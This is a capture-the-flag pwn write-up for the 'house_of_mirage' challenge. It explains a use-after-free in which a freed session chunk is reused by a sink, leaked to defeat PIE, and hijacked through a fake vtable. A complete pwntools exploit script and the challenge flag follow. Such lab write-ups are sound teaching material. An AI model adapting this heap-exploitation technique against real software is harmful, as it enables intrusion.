# House Of Mirage

## Meta

- Category: pwn
- Target: `10.112.0.12:45862`
- Binary: `house_of_mirage`
- Flag: `grodno{d0eb1bb4-3d6a-459b-9344-a56f47fbb8a0}`

## Summary

The expiry worker frees a session object, but the session table still keeps a stale pointer. A new sink allocation can reuse that freed chunk, so telemetry exposes the same chunk through both the stale session view and the active sink view.

The stale session pointer leaks the sink vtable, which gives the PIE base, and also leaks the reused heap object address. After the sweeper frees the same chunk again, the next sink reuses it. Importing a crafted profile through the stale session writes a fake vtable into the chunk, and flushing the sink dispatches to the archive replay function.

## Steps

1. Create session `0`, then arm it for immediate expiry.
2. Wait for the sweeper to free the session chunk.
3. Create sink `0`; it reuses the freed session chunk.
4. Use telemetry to leak:
   - sink vtable pointer
   - reused object heap address
5. Let the sweeper free the chunk again, then create sink `1` on the same allocation.
6. Import a profile through the stale session pointer:
   - fake vtable pointer: `object + 8`
   - fake vtable entry: `archive_replay`
7. Flush sink `1` to call archive replay and print the flag.

## Exploit

```python
#!/usr/bin/env python3
import os, re, time
from pwn import *

context.binary = exe = ELF('./house_of_mirage', checksec=False)
context.log_level = os.getenv('LOG', 'info')

HOST = os.getenv('HOST', '10.112.0.12')
PORT = int(os.getenv('PORT', '45862'))

OFF_SINK_VTABLE = 0x6030
OFF_ARCHIVE_REPLAY = 0x3970

def conn():
    if args.REMOTE:
        return remote(HOST, PORT)
    return process([exe.path])

io = conn()
io.recvuntil(b'> ')

io.send(b'1\nowner\ntag\n')
io.recvuntil(b'> ')
io.send(b'5\n0\n0\n')
io.recvuntil(b'> ')
time.sleep(0.06)

io.send(b'6\nsink\n2\n0\n9\n')
out = io.recvuntil(b'pool chunk size: 0x60\n', timeout=2)

vtable = int(re.search(rb'serial: 0x([0-9a-fA-F]+)', out).group(1), 16)
pie = vtable - OFF_SINK_VTABLE
flag_func = pie + OFF_ARCHIVE_REPLAY
obj = int(re.search(rb'active sessions:\n\s+\[0\]\s+(0x[0-9a-fA-F]+)', out).group(1), 16)
fake_vtable = obj + 8

io.recvuntil(b'> ')
time.sleep(0.06)
payload = p64(fake_vtable) + p64(flag_func)
io.send(b'6\nsink2\n3\n0\n16\n' + payload + b'8\n1\nmsg\n')

print(io.recvall(timeout=3).decode('latin1'), end='')
```
